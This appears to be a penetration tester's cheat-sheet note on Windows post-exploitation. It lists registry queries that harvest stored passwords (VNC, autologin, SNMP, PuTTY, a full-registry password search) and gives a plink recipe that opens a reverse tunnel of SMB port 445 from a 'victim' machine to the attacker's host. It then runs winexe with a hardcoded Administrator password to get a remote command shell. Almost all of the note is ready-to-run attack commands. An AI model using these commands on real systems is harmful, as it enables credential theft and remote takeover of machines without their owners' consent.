# Passwords and Port Forwarding
-------------------------------------------------------

checking for passwords in the registries:

```powershell

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


## Port forwarding using plink 
- download plink.exe (32 or 64bit) on the local system 
- upload plink.exe to the victim machine 
- install ssh on the attacking machine 
- edit /etc/ssh/sshd_config -> PermitRootLogin yes
- service ssh restart
- on the victim windows machine:

```powershell
plink.exe -l root -pw (password of our machine) -R 445:127.0.0.1:445 OURIP 
```

- netstat -ano to check if the port forwarding succeded
- use [[1000 - Tools#winexe]] to execute windows commands from linux:

```bash
winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
```